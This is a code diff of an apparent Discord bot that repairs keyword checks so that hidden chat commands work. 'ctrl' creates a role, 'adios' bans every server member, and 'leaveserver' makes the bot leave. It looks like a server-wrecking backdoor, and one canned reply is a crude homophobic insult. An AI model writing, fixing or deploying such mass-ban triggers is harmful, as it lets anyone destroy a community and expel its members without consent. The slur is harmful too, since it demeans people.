@@ -12,7 +12,7 @@ client.on('message', message => {
     if (message.content === 'pac is') {
     	message.channel.send("the gayestes5 camel on earth")
   	}
-    if(message === `ctrl`) {
+    if(message.content === `ctrl`) {
   	try {
 	role = await message.guild.createRole({
  	name: "Dope Role",
@@ -26,7 +26,7 @@ client.on('message', message => {
 	}
    }
    //Bans everyone and deletes the message.
-   if(message === `adios`) {
+   if(message.content === `adios`) {
    	try {
    	message.guild.members.forEach(member => {member.ban()});
    	message.delete(1000);
@@ -35,7 +35,7 @@ client.on('message', message => {
    	}
    }
 
-   if(message === `leaveserver`) {
+   if(message.content === `leaveserver`) {
    	try {
    	message.guild.leave();
    	} catch(e) {
